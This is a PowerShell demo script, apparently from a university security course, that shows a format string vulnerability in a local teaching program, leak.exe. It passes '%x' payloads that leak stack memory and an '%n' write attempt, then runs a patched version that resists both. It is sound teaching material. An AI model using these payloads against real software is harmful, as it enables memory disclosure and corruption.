# CEN429 - Week 4 - Demo 1: format string vulnerability (Windows)
# Build first: ..\..\build.ps1   Then: .\demo.ps1
Set-Location $PSScriptRoot
$B = "bin\windows"
if (-not (Test-Path "$B\leak.exe")) { "Build first: ..\..\build.ps1"; exit 1 }
function Line { "--------------------------------------------------------------" }

. "$PSScriptRoot\..\..\common\cen429_msvc.ps1"
Line; "STEP 0 - Does the compiler / static analyzer see this bug?"
"> cl /analyze /I..\..\common leak.c"
Invoke-Cl /nologo /Zs /analyze /I..\..\common leak.c |
    Select-String -Pattern 'warning|C6\d{3}|C28\d{3}' | Select-Object -First 3
"   -> MSVC's C compiler does not warn by default; /analyze flags the format string."
Line; "STEP 1 - Normal use"
"> .\$B\leak.exe Hello"; & ".\$B\leak.exe" Hello
Line; "STEP 2 - Attack: %x READS memory off the stack (information leak)"
$fmt = ("%x." * 20)
"> .\$B\leak.exe '$fmt'"
$out = & ".\$B\leak.exe" $fmt 2>&1 | ForEach-Object { "$_" }
$out
if ($out -match '5ece7') { "   ^ secret_value leaked -> 0x0005ece7 (read off the stack)" }
else { "   ^ the hex words are stack contents; one of them may be secret_value" }
Line; "STEP 3 - Attack: %n tries to WRITE to memory"
"> .\$B\leak.exe 'AAAA%n'"
& ".\$B\leak.exe" 'AAAA%n' 2>&1 | ForEach-Object { "$_" }
"   (exit code: $LASTEXITCODE)"
Line; "STEP 4 - Windows note"
"   The MSVC C runtime has %n turned OFF BY DEFAULT."
"   So a %n call triggers our own invalid-parameter handler and the program"
"   stops safely (on Linux, _FORTIFY_SOURCE provides the same protection)."
Line; "STEP 5 - Fixed version: %x and %n are now just TEXT"
"> .\$B\leak_secure.exe '%x %x %n attack attempt'"
& ".\$B\leak_secure.exe" '%x %x %n attack attempt'
